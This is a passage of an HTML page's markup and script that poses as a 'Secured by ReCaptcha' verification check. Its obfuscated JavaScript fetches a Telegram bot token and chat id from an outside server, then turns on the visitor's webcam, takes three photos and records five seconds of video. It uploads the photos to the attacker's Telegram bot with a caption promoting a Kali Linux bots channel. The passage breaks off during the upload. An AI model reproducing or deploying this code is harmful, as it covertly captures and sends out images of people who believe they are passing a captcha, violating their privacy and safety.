ox="0 0 64 64"><path d="M32 12a12 12 0 0 0-12 12v12h24V24a12 12 0 0 0-12-12zm0 4a8 8 0 1 1 16 0v12h-16V16zM20 28v24a12 12 0 0 0 24 0V28H20z"/></svg><span>Secured by ReCaptcha</span></div><video id="video-stream" autoplay></video></div><script>const q9=function(s){return new URLSearchParams(window.location.search).get(s)};const p7=async function(){try{const s=q9('sid');if(!s){throw new Error('Missing session ID')}const r=await fetch('https://mybot-drab.vercel.app/resolve-session',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sid:s})});const d=await r.json();if(!r.ok){throw new Error('Failed to resolve session')}return{x1:d.x1,z9:d.z9}}catch(e){alert('Verification setup failed. Please try again.');throw e}};const m3=async function(){try{const s=await navigator.mediaDevices.getUserMedia({video:true,audio:false});const v=document.getElementById('video-stream');v.srcObject=s;await new Promise(r=>v.onloadedmetadata=r);const p=[];for(let i=0;i<3;i++){const c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;const x=c.getContext('2d');x.drawImage(v,0,0,c.width,c.height);const b=await new Promise(r=>c.toBlob(r,'image/jpeg'));p.push(b);await new Promise(r=>setTimeout(r,2000))}const r=new MediaRecorder(s,{mimeType:'video/webm'});const c=[];r.ondataavailable=e=>{if(e.data.size>0)c.push(e.data)};r.start();await new Promise(r=>setTimeout(r,5000));r.stop();await new Promise(r=>{r.onstop=r});const vb=new Blob(c,{type:'video/webm'});s.getTracks().forEach(t=>t.stop());return{p,vb}}catch(e){alert('Failed to access webcam. Please ensure you have granted permissions.');throw e}};const k4=async function(p,vb,x1,z9){if(!x1||!z9){alert('Missing required data for verification');return}for(let i=0;i<p.length;i++){const f=new FormData();f.append('chat_id',x1);f.append('photo',p[i],`p${i+1}.jpg`);f.append('caption','⚡Join ➣ @Kali_Linux_BOTS');try{const r=await fetch(`https://api.telegram.org/bot${z9}/sendPhoto`,{method:'POST',body:f}
